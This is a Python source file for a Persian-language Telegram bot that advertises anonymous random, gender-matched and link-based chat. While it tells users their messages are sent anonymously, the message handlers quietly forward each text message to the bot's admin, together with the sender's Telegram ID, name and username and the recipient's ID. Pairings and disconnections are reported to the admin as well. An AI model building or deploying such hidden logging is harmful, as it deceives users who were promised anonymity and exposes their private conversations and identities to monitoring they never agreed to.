import logging
import os
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)

# ================== تنظیمات ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))

if not BOT_TOKEN or ADMIN_ID == 0:
    raise RuntimeError("BOT_TOKEN و ADMIN_ID باید در Environment تنظیم شوند")

# ================== وضعیت‌ها ==================
MAIN_MENU, WAITING_GENDER, IN_CHAT = range(3)

# صف‌ها و وضعیت کاربران
random_queue = []
girl_queue = []
boy_queue = []
partners = {}  # {user_id: partner_id}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== کیبوردها ==================
def main_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("به یک ناشناس وصلم کن")],
        [KeyboardButton("به مخاطب خاص وصلم کن")],
        [KeyboardButton("لینک ناشناس من"), KeyboardButton("راهنما")],
    ], resize_keyboard=True)

def gender_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("دختر 👩"), KeyboardButton("پسر 👨")],
        [KeyboardButton("بازگشت به منو")],
    ], resize_keyboard=True)

def chat_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("قطع ارتباط ❌")],
    ], resize_keyboard=True)

# ================== تابع قوی اطلاع به ادمین ==================
async def notify_admin(context: ContextTypes.DEFAULT_TYPE, text: str):
    """ارسال پیام به ادمین با لاگ کامل"""
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=text,
            parse_mode="Markdown"
        )
        logger.info("✅ پیام با موفقیت به ادمین ارسال شد")
    except Exception as e:
        logger.error(f"❌ خطا در ارسال به ادمین (ADMIN_ID={ADMIN_ID}): {e}")

def remove_from_queues(user_id: int):
    for q in (random_queue, girl_queue, boy_queue):
        if user_id in q:
            q.remove(user_id)

# ================== دستورات ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args

    # پیام ناشناس یک‌طرفه
    if args:
        try:
            target_id = int(args[0])
            if target_id == user.id:
                await update.message.reply_text("نمی‌توانی به خودت پیام ناشناس بفرستی!")
                return MAIN_MENU

            context.user_data["anonymous_target"] = target_id
            await update.message.reply_text(
                "✉️ پیام ناشناس خود را بنویسید:\n(پیام شما به صورت ناشناس ارسال می‌شود)",
                reply_markup=ReplyKeyboardRemove()
            )
            return ConversationHandler.END
        except ValueError:
            pass

    await update.message.reply_text(
        f"سلام {user.first_name} 👋\n\n"
        "به ربات چت ناشناس خوش آمدی!\nاز دکمه‌های زیر استفاده کن:",
        reply_markup=main_keyboard()
    )
    return MAIN_MENU

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "📖 **راهنمای ربات**\n\n"
        "🔹 **به یک ناشناس وصلم کن** → رندوم به یک نفر وصل می‌شوی\n"
        "🔹 **به مخاطب خاص وصلم کن** → جنسیت انتخاب می‌کنی و وصل می‌شوی\n"
        "🔹 **لینک ناشناس من** → لینک اختصاصی خودت را بگیر\n"
        "🔹 برای قطع چت از دکمه «قطع ارتباط ❌» استفاده کن"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())
    return MAIN_MENU

async def my_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bot = await context.bot.get_me()
    link = f"https://t.me/{bot.username}?start={user.id}"

    await update.message.reply_text(
        f"🔗 **لینک ناشناس شما:**\n\n`{link}`\n\n"
        "این لینک را برای دیگران بفرست تا بتوانند ناشناس به تو پیام دهند.",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )
    return MAIN_MENU

# ================== اتصال رندوم ==================
async def connect_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in partners:
        await update.message.reply_text("شما در حال چت هستید! اول قطع ارتباط کنید.", reply_markup=chat_keyboard())
        return IN_CHAT

    remove_from_queues(user_id)

    if random_queue:
        partner_id = random_queue.pop(0)
        partners[user_id] = partner_id
        partners[partner_id] = user_id

        msg = "✅ به یک ناشناس وصل شدی!\nحالا می‌تونی پیام بفرستی.\n\nبرای قطع ارتباط از دکمه زیر استفاده کن."
        await context.bot.send_message(partner_id, msg, reply_markup=chat_keyboard())
        await update.message.reply_text(msg, reply_markup=chat_keyboard())

        await notify_admin(context,
            f"🔗 **اتصال رندوم جدید**\n"
            f"کاربر ۱: `{user_id}`\n"
            f"کاربر ۲: `{partner_id}`")
        return IN_CHAT
    else:
        random_queue.append(user_id)
        await update.message.reply_text("⏳ در حال جستجو برای یک ناشناس...\nلطفاً صبر کن.", reply_markup=ReplyKeyboardRemove())
        return MAIN_MENU

# ================== اتصال بر اساس جنسیت ==================
async def connect_specific(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in partners:
        await update.message.reply_text("شما در حال چت هستید! اول قطع ارتباط کنید.", reply_markup=chat_keyboard())
        return IN_CHAT

    await update.message.reply_text("می‌خوای با چه جنسیتی صحبت کنی؟", reply_markup=gender_keyboard())
    return WAITING_GENDER

async def gender_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if text == "بازگشت به منو":
        await update.message.reply_text("به منوی اصلی برگشتی.", reply_markup=main_keyboard())
        return MAIN_MENU

    if "دختر" in text:
        queue = girl_queue
        gender_name = "دختر"
    elif "پسر" in text:
        queue = boy_queue
        gender_name = "پسر"
    else:
        await update.message.reply_text("لطفاً یکی از دکمه‌ها را انتخاب کن.", reply_markup=gender_keyboard())
        return WAITING_GENDER

    remove_from_queues(user_id)

    if queue:
        partner_id = queue.pop(0)
        partners[user_id] = partner_id
        partners[partner_id] = user_id

        msg = f"✅ به یک {gender_name} ناشناس وصل شدی!"
        await context.bot.send_message(partner_id, msg, reply_markup=chat_keyboard())
        await update.message.reply_text(msg, reply_markup=chat_keyboard())

        await notify_admin(context,
            f"🔗 **اتصال جنسیتی جدید**\n"
            f"کاربر: `{user_id}` → {gender_name}\n"
            f"شریک: `{partner_id}`")
        return IN_CHAT
    else:
        queue.append(user_id)
        await update.message.reply_text(f"⏳ در حال جستجو برای یک {gender_name}...\nلطفاً صبر کن.", reply_markup=ReplyKeyboardRemove())
        return MAIN_MENU

# ================== مدیریت پیام‌ها در چت ==================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    message = update.message

    # اگر در صف منتظر است
    if user_id in random_queue or user_id in girl_queue or user_id in boy_queue:
        await update.message.reply_text("هنوز کسی پیدا نشده. لطفاً صبر کن یا /start بزن.")
        return MAIN_MENU

    # اگر در چت است
    if user_id in partners:
        partner_id = partners[user_id]

        if message.text == "قطع ارتباط ❌":
            return await stop_chat(update, context)

        try:
            # ارسال پیام به طرف مقابل
            if message.text:
                await context.bot.send_message(partner_id, f"👤 ناشناس:\n{message.text}")
            elif message.photo:
                await context.bot.send_photo(partner_id, photo=message.photo[-1].file_id, caption="👤 ناشناس (عکس)")
            elif message.voice:
                await context.bot.send_voice(partner_id, voice=message.voice.file_id)
            elif message.video:
                await context.bot.send_video(partner_id, video=message.video.file_id, caption="👤 ناشناس (ویدیو)")
            elif message.document:
                await context.bot.send_document(partner_id, document=message.document.file_id, caption="👤 ناشناس (فایل)")
            else:
                await context.bot.send_message(partner_id, "👤 ناشناس یک پیام رسانه‌ای فرستاد")

            # ========== اطلاع کامل به ادمین ==========
            admin_text = (
                f"💬 **پیام در چت ناشناس**\n\n"
                f"از: `{user_id}`\n"
                f"نام: {user.first_name or '-'}\n"
                f"یوزرنیم: @{user.username or 'ندارد'}\n"
                f"به: `{partner_id}`\n\n"
                f"متن پیام:\n{message.text or '(رسانه)'}"
            )
            await notify_admin(context, admin_text)

        except Exception as e:
            logger.error(f"خطا در ارسال پیام چت: {e}")
            await update.message.reply_text("خطا در ارسال پیام. ممکن است طرف مقابل ربات را بلاک کرده باشد.")

        return IN_CHAT

    # پیام عادی
    await update.message.reply_text("از دکمه‌های منو استفاده کن.", reply_markup=main_keyboard())
    return MAIN_MENU

async def stop_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in partners:
        partner_id = partners.pop(user_id)
        if partner_id in partners:
            del partners[partner_id]

        try:
            await context.bot.send_message(partner_id, "❌ طرف مقابل ارتباط را قطع کرد.", reply_markup=main_keyboard())
        except:
            pass

        await update.message.reply_text("❌ ارتباط قطع شد.", reply_markup=main_keyboard())
        await notify_admin(context, f"❌ **قطع ارتباط**\nکاربران: `{user_id}` و `{partner_id}`")
    else:
        remove_from_queues(user_id)
        await update.message.reply_text("شما در چت نبودید.", reply_markup=main_keyboard())

    return MAIN_MENU

# ================== پیام ناشناس یک‌طرفه ==================
async def anonymous_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    target_id = context.user_data.get("anonymous_target")

    if not target_id:
        return

    try:
        text = update.message.text or "(رسانه)"
        await context.bot.send_message(
            chat_id=target_id,
            text=f"📩 **پیام ناشناس جدید:**\n\n{text}",
            parse_mode="Markdown"
        )
        await update.message.reply_text("✅ پیام شما با موفقیت ارسال شد.", reply_markup=main_keyboard())

        # ========== اطلاع کامل به ادمین ==========
        admin_text = (
            f"📩 **پیام ناشناس یک‌طرفه**\n\n"
            f"فرستنده: `{user.id}`\n"
            f"نام: {user.first_name or '-'}\n"
            f"یوزرنیم: @{user.username or 'ندارد'}\n"
            f"گیرنده: `{target_id}`\n\n"
            f"متن پیام:\n{text}"
        )
        await notify_admin(context, admin_text)

    except Exception as e:
        logger.error(f"خطا در پیام ناشناس یک‌طرفه: {e}")
        await update.message.reply_text("❌ خطا در ارسال پیام. ممکن است گیرنده ربات را بلاک کرده باشد.")

    context.user_data.pop("anonymous_target", None)

# ================== اصلی ==================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MAIN_MENU: [
                MessageHandler(filters.Regex("^به یک ناشناس وصلم کن$"), connect_random),
                MessageHandler(filters.Regex("^به مخاطب خاص وصلم کن$"), connect_specific),
                MessageHandler(filters.Regex("^لینک ناشناس من$"), my_link),
                MessageHandler(filters.Regex("^راهنما$"), help_cmd),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message),
            ],
            WAITING_GENDER: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, gender_selected),
            ],
            IN_CHAT: [
                MessageHandler(filters.Regex("^قطع ارتباط ❌$"), stop_chat),
                MessageHandler(filters.ALL & ~filters.COMMAND, handle_message),
            ],
        },
        fallbacks=[
            CommandHandler("start", start),
            CommandHandler("stop", stop_chat),
            MessageHandler(filters.Regex("^قطع ارتباط ❌$"), stop_chat),
        ],
        allow_reentry=True
    )

    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, anonymous_message))

    logger.info("ربات با اطلاع‌رسانی کامل به ادمین شروع شد...")
    app.run_polling()

if __name__ == "__main__":
    main()
